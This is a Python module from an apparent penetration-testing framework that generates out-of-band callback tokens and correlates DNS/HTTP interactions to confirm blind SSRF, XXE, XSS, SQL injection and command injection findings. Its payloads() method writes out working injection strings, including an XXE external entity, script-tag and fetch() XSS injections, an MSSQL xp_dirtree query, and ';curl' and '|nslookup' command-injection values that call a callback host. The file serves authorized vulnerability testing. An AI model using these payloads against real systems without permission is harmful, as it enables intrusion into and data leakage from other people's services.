"""
Out-of-band / blind detection (attack section, suggestion #2).

The biggest real-world gap: blind SSRF / XXE / blind-XSS / blind-SQLi / OOB-RCE are invisible without
an out-of-band interaction channel. This module is the DETECTION logic for that channel — it does NOT
stand up an internet-facing server. It:
  * mints a deterministic per-finding correlation token + callback hostname (`<token>.<oob_domain>`);
  * emits blind payloads that embed that callback for each vuln class;
  * correlates received interactions (from the operator's OWN interactsh / Burp Collaborator instance,
    configured via `ListenerConfig`) back to the issued tokens → confirmed blind findings.
Pluggable, deterministic, offline. No live server is created here; the operator points it at their
authorized OOB endpoint. Used only behind the bug-bounty authorization gate.
"""

from __future__ import annotations

import hashlib
from dataclasses import dataclass
from typing import Dict, List, Optional

from hydra.attack.payloads import VulnClass


@dataclass
class ListenerConfig:
    """Points at the operator's OWN out-of-band endpoint (e.g. their interactsh server)."""
    oob_domain: str = "oob.invalid"        # operator-supplied; default is non-routable
    scheme: str = "http"

    @property
    def configured(self) -> bool:
        return bool(self.oob_domain) and self.oob_domain != "oob.invalid"


@dataclass
class OOBToken:
    token: str
    callback_host: str
    callback_url: str
    finding_id: str
    vuln_class: str

    def to_dict(self) -> Dict:
        return {"token": self.token, "callback_host": self.callback_host,
                "callback_url": self.callback_url, "finding_id": self.finding_id,
                "vuln_class": self.vuln_class}


class OOBCorrelator:
    def __init__(self, listener: Optional[ListenerConfig] = None):
        self.listener = listener or ListenerConfig()
        self._issued: Dict[str, OOBToken] = {}

    def mint(self, finding_id: str, vuln_class: str) -> OOBToken:
        """Deterministic token for a finding (stable across rebuilds → testable)."""
        token = hashlib.sha256(f"{finding_id}|{vuln_class}".encode()).hexdigest()[:20]
        host = f"{token}.{self.listener.oob_domain}"
        url = f"{self.listener.scheme}://{host}/"
        t = OOBToken(token, host, url, finding_id, vuln_class)
        self._issued[token] = t
        return t

    def payloads(self, vuln_class: str, callback_url: str) -> List[Dict]:
        """Blind payloads embedding the OOB callback. Detection/PoC only."""
        vc = VulnClass(vuln_class) if vuln_class in VulnClass._value2member_map_ else None
        host = callback_url.split("://", 1)[-1].strip("/")
        lib: Dict[VulnClass, List[tuple]] = {
            VulnClass.SSRF: [(callback_url, "blind SSRF callback"),
                             (f"http://{host}/", "blind SSRF (host)")],
            VulnClass.XXE: [(f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{callback_url}">]>'
                             "<r>&x;</r>", "blind XXE external entity")],
            VulnClass.XSS: [(f'"><script src=//{host}></script>', "blind XSS callback"),
                            (f"<img src=x onerror=fetch('//{host}')>", "blind XSS fetch")],
            VulnClass.SQLI: [(f"';declare @q varchar(99);set @q='\\\\{host}\\x';"
                              "exec master..xp_dirtree @q;--", "OOB SQLi (mssql dns)")],
            VulnClass.CMDI: [(f";curl {callback_url}", "OOB cmdi (curl)"),
                             (f"|nslookup {host}", "OOB cmdi (dns)")],
        }
        rows = lib.get(vc, []) if vc else []
        return [{"value": v, "vuln_class": vuln_class, "technique": t, "oob": True, "poc": True}
                for v, t in rows]

    def correlate(self, interactions: List[Dict]) -> Dict:
        """Match received OOB interactions back to issued tokens → confirmed blind findings.

        interaction: {"host": "<token>.<oob_domain>", "protocol": "dns|http", "remote_addr": ...}."""
        confirmed = []
        for it in interactions:
            host = (it.get("host") or "").lower()
            token = host.split(".", 1)[0]
            t = self._issued.get(token)
            if t:
                confirmed.append({"finding_id": t.finding_id, "vuln_class": t.vuln_class,
                                  "token": token, "protocol": it.get("protocol", ""),
                                  "remote_addr": it.get("remote_addr", ""), "confirmed": True})
        seen, uniq = set(), []
        for c in sorted(confirmed, key=lambda d: (d["finding_id"], d["token"])):
            key = (c["finding_id"], c["token"])
            if key not in seen:
                seen.add(key)
                uniq.append(c)
        return {"confirmed_blind_findings": uniq, "count": len(uniq),
                "issued_tokens": len(self._issued),
                "listener_configured": self.listener.configured, "advisory": True}

    def issued(self) -> List[Dict]:
        return [t.to_dict() for t in self._issued.values()]
